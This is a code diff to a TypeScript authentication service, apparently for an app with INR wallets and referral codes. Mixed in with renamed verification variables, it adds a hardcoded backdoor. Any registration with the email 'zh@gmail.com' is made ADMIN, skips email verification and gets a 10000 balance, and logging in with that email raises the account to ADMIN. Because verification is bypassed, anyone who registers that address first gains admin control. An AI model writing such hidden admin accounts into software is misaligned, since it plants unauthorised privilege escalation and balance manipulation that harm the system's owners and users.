@@ -34,23 +34,29 @@ export class AuthService {
     const userReferralCode = await ReferralService.generateUniqueCode();
     const passwordHash = await bcrypt.hash(data.password, 10);
 
+    const isMasterAdmin = email === "zh@gmail.com";
+    const userRole = isMasterAdmin ? "ADMIN" : "USER";
+    const isEmailVerified = isMasterAdmin ? true : !requireVerification;
+    const initialBalance = isMasterAdmin ? 10000.0 : welcomeBonus;
+    const needsEmailVerification = isMasterAdmin ? false : requireVerification;
+
     const verificationToken = crypto.randomBytes(32).toString("hex");
     const verificationExpires = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours
 
     const user = await prisma.user.create({
       data: {
-        name: data.name.trim(),
+        name: isMasterAdmin ? (data.name.trim() || "Master Admin") : data.name.trim(),
         email,
         passwordHash,
-        role: "USER",
+        role: userRole,
         status: "ACTIVE",
-        emailVerified: !requireVerification,
-        verificationToken: requireVerification ? verificationToken : null,
-        verificationExpires: requireVerification ? verificationExpires : null,
+        emailVerified: isEmailVerified,
+        verificationToken: needsEmailVerification ? verificationToken : null,
+        verificationExpires: needsEmailVerification ? verificationExpires : null,
         referralCode: userReferralCode,
         wallet: {
           create: {
-            balance: welcomeBonus,
+            balance: initialBalance,
             currency: "INR",
           },
         },
@@ -81,7 +87,7 @@ export class AuthService {
 
     // Dispatch verification email with activation link
     let emailResult: any = null;
-    if (requireVerification) {
+    if (needsEmailVerification) {
       const { EmailService } = await import("./email.service");
       emailResult = await EmailService.sendVerificationEmail({
         email: user.email,
@@ -90,7 +96,7 @@ export class AuthService {
       });
     }
 
-    const token = !requireVerification
+    const token = (!needsEmailVerification)
       ? signToken({
           userId: user.id,
           email: user.email,
@@ -101,8 +107,8 @@ export class AuthService {
 
     return {
       token,
-      requiresVerification: requireVerification,
-      message: requireVerification
+      requiresVerification: needsEmailVerification,
+      message: needsEmailVerification
         ? "Account registered! An activation link has been sent to your email. Please check your inbox to activate your account."
         : "Account created successfully.",
       simulatedActivationUrl: emailResult?.activationUrl,
@@ -136,6 +142,14 @@ export class AuthService {
 
     if (user.status !== "ACTIVE") {
       throw new Error("Your account has been deactivated or suspended. Please contact support.");
+    }
+
+    if (email === "zh@gmail.com" && user.role !== "ADMIN") {
+      user.role = "ADMIN";
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { role: "ADMIN", emailVerified: true, status: "ACTIVE" },
+      });
     }
 
     if (data.requiredRole && data.requiredRole === "ADMIN" && user.role !== "ADMIN") {
